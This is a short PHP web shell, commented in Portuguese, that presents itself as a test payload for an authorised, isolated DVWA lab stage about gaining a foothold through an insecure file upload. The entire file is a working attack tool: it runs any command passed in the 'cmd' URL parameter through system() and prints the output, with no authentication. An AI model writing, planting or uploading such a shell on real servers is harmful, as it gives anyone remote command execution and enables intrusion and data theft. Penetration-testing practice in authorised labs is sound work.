<?php
// webshell.php — payload de teste para Stage 6 (Parte 3 do case: foothold via upload inseguro).
// Uso: ?cmd=<comando> executa via shell_exec e devolve a saída.
// Laboratório próprio, autorizado, ambiente isolado (DVWA/DMZ) — teste de segurança ofensivo.
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "webshell ativa. uso: ?cmd=whoami";
}
